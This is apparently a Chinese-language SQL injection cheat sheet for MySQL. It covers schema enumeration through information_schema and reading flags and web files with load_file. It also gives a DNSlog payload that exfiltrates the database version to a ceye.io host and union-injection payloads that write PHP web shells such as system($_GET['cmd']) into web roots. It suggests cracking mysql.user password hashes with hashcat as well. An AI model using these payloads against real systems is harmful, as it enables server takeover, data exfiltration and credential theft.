mysql5.5后默认存储引擎InnoDB
5.5前默认MyISAM

存储引擎：
```
InnoDB：支持事务ACID，支持外键。

MyISAM：不支持事务，外键，访问快。

Memory：缓存如redis，数据存储在内存，速度快，支持hash索引。
```
## **mysql内置变量**
```
数据库所在位置：
select @@datadir;
select @@basedir;

所使用操作系统：
select @@version_compile_os

查看当前连接用户：
show processlist;

当前库名：
database()

当前用户名:
user()

数据库版本：
version()

权限查询：
SHOW GRANTS;
SHOW GRANTS ON *.*;


SHOW GRANTS FOR CURRENT_USER();   -- 当前登录账号  
SHOW GRANTS FOR 'u'@'h';          -- 指定账号
```
## **mysql内置库表**
```
登录用户是root用户可以查询：
select * from mysql.user     #查看数据库所有用户权限，和加密后的密码，可用cmd5.com  hashcat等破译密码
```
mysql5.0以上information_schema库：
纪录了数据库中所有库名，表名，字段名。
```
select(group_concat(schema_name))from(information_schema.schemata)

进入库查表 use information_schema;
进入不了库使用 库名.表名 查询。

记录数据库所有库名的表：
表名：schemata
数据库名字段：schema_name

记录数据库所有表名的表：
表名：tables
表名字段：table_name
表所属数据库字段：table_schema

记录数据库所有字段名的表:
表名：columns
字段名的字段：column_name
字段所属表字段：table_name
字段所属表的所属库字段：table_schema
```
如果information_schema被禁止，通过sys.schema获取当前数据库表名
通过无列名注入获取表字段。
<https://www.cnblogs.com/hello-there/p/12918265.html>



## **mysql读写文件**
```
my.ini/my.cnf配置读写权限：
--secure-file-priv = null  //任何不可读写
--secure-file-priv =        //任何可读写
--secure-file-priv = c:\   //只有C盘可读写
在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径读写文件
在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以读写文件
查看配置：
show variables like '%secure%';
select @@secure_file_priv;


读文件：
select load_file('/sql.txt');
select load_file(concat('\\\\',(select version()),'.2qytvx.ceye.io\\sql'));
windows支持的路径无回显DNSlog携带

读flag：
select hex(load_file('E:/flag.txt')); //十六制读出666C61677B7361636A6E733132337D
select unhex('666C61677B7361636A6E733132337D');

load_file('/var/www/html/flag.php');
(select(load_file("/flag.txt")))#
group_concat(load_file('/var/www/html/flag.php'));






写文件：
二进制写
select "<?php phpinfo(); ?>" into dumpfile '/var/www/html/phpinfo.php';
文本格式写
select '<?php system($_GET[1]); ?>' into outfile 'c:\\phpstudy\\PHPTutorial\\WWW\\gg.php';

联合注入前报错后写webshell文件：
写入文件路径为相对路径时，默认写入到数据库所在文件夹中
1111111'union select 1,2,"<?php @eval($_GET['string'])?>" into outfile "1.php" --+
也可以写成绝对路径，此处为Windows的路径
1111111'union select 1,2,"<?php @eval($_GET['string'])?>" into outfile "D:\\web_security\\1.php" --+
1111111'union select 1,2,"<?php system($_GET['cmd'])?>" into outfile "D:\\web_security\\1.php" --+
相对路径的写法
-14' union select 1,2,"<?php system($_GET['cmd'])?>" into outfile "../../www/sqli/Less-1/2.php" --+
```
